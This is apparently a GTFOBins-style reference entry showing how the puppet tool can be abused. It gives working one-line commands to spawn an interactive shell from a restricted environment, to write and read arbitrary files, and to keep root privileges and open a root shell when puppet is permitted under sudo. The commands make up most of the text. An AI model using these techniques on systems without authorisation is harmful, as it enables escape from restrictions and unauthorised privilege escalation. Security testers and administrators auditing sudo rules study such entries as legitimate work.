# GTFOBin: puppet

## Shell

It can be used to break out from restricted environments by spawning an interactive system shell.

```
puppet apply -e "exec { '/bin/sh -c \"exec sh -i <$(tty) >$(tty) 2>$(tty)\"': }"
```

## File write

It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.

The file path must be absolute.

```
LFILE="/tmp/file_to_write"
puppet apply -e "file { '$LFILE': content => 'DATA' }"
```

## File read

It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.

The read file content is corrupted by the `diff` output format. The actual `/usr/bin/diff` command is executed.

```
LFILE=file_to_read
puppet filebucket -l diff /dev/null $LFILE
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

```
sudo puppet apply -e "exec { '/bin/sh -c \"exec sh -i <$(tty) >$(tty) 2>$(tty)\"': }"
```